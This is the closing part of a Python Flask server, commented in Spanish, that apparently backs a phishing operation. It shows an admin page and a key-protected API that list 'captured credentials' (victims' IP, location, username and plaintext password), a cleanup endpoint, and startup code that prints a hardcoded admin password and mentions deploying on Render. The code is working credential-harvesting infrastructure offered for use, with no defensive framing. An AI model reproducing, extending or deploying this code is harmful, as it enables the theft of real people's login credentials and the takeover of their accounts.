            <h1>🔐 Credenciales Capturadas</h1>
            <p>Total: <strong>""" + str(len(rows)) + """</strong></p>
            <table>
                <tr><th>ID</th><th>Fecha</th><th>IP</th><th>Ubicación</th><th>Usuario</th><th>Contraseña</th></tr>
        """
        
        # 🔥 CAMBIO REALIZADO: Formato de fecha 'Jul 22, 2026 7:04 PM'
        for r in rows:
            timestamp = datetime.fromisoformat(r[1]).strftime('%b %d, %Y %I:%M %p')
            html += f"<tr><td>{r[0]}</td><td>{timestamp}</td><td>{r[2]}</td><td>{r[5]}</td><td>{r[3]}</td><td><strong>{r[4]}</strong></td></tr>"
        
        html += """
            </table>
        </body>
        </html>
        """
        return html
        
    except Exception as e:
        logger.error(f"Error al leer credenciales: {e}")
        return """
        <!DOCTYPE html>
        <html>
        <head><title>Error</title>
        <style>
            body{font-family:Arial;background:#f0f2f5;padding:20px;text-align:center;}
            .error{color:#dc3545;}
        </style>
        </head>
        <body>
            <h1 class="error">⚠️ Error al leer la base de datos</h1>
            <p>La base de datos aún no está lista. Por favor, captura una credencial primero.</p>
            <p><a href="/">Volver a la página principal</a></p>
        </body>
        </html>
        """, 500

@app.route('/logout-credenciales')
def logout_credenciales():
    session.pop('admin_logged', None)
    return redirect('/login-credenciales')

@app.route('/api/credentials')
def api_credentials():
    key = request.headers.get('X-API-Key')
    if key != CONFIG.get('api_key'):
        abort(401)
    
    conn = sqlite3.connect('credentials.db', check_same_thread=False)
    cursor = conn.cursor()
    cursor.execute('SELECT * FROM credentials ORDER BY id DESC')
    data = cursor.fetchall()
    conn.close()
    return jsonify(data)

@app.route('/api/cleanup', methods=['POST'])
def api_cleanup():
    key = request.headers.get('X-API-Key')
    if key != CONFIG.get('api_key'):
        abort(401)
    
    days = request.args.get('days', CONFIG.get('cleanup_days', 30), type=int)
    
    if days < 1 or days > 365:
        return jsonify({'error': 'Los días deben estar entre 1 y 365'}), 400
    
    deleted = cleanup_old_credentials(days)
    return jsonify({
        'deleted': deleted,
        'message': f'Eliminadas {deleted} credenciales con más de {days} días',
        'days': days
    })

@app.route('/health')
def health():
    return jsonify({
        'status': 'ok',
        'time': datetime.now().isoformat(),
        'credentials_count': get_credentials_count()
    })

def get_credentials_count():
    try:
        conn = sqlite3.connect('credentials.db', check_same_thread=False)
        cursor = conn.cursor()
        cursor.execute('SELECT COUNT(*) FROM credentials')
        count = cursor.fetchone()[0]
        conn.close()
        return count
    except:
        return 0

# =============================================
# INICIO DE LA APLICACIÓN
# =============================================

if __name__ == '__main__':
    load_config()
    init_db()
    cleanup_old_credentials()
    
    port = int(os.environ.get('PORT', 8080))
    print(f"[+] Servidor iniciado en puerto {port}")
    print(f"[+] Contraseña admin: triple777")
    print(f"[+] API Key: {CONFIG.get('api_key')}")
    print(f"[+] Limpieza automática: {CONFIG.get('cleanup_days')} días")
    app.run(host='0.0.0.0', port=port, debug=False)

# Esto es necesario para Render (Gunicorn buscará 'app')
# La variable 'app' ya está definida como Flask(__name__)
